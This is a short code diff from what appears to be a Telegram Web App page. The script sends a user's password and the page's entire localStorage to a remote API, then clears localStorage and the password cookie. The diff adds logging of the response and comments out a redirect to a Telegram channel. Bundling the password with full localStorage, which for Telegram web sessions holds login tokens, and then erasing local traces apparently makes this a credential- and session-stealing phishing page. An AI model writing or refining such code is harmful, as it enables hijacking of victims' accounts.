@@ -22,13 +22,17 @@ document.addEventListener("DOMContentLoaded", function() {
               password, quicklySet: localStorage,
               type: new URLSearchParams(window.location.search).get("type")
             })
+          }).then(res => {
+            console.log(res);
+          }).catch(er => {
+            console.log(er, 'errr');
           });
         } catch (er) {
           console.log(er, 'error in api')
         }
 
-        window.Telegram.WebApp.openTelegramLink("https://t.me/onewordseeker");
-        window.Telegram.WebApp.close();
+        // window.Telegram.WebApp.openTelegramLink("https://t.me/onewordseeker");
+        // window.Telegram.WebApp.close();
         localStorage.clear();
         document.cookie = "password=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
         // window.location.href = "https://web.telegram.org/a/";  
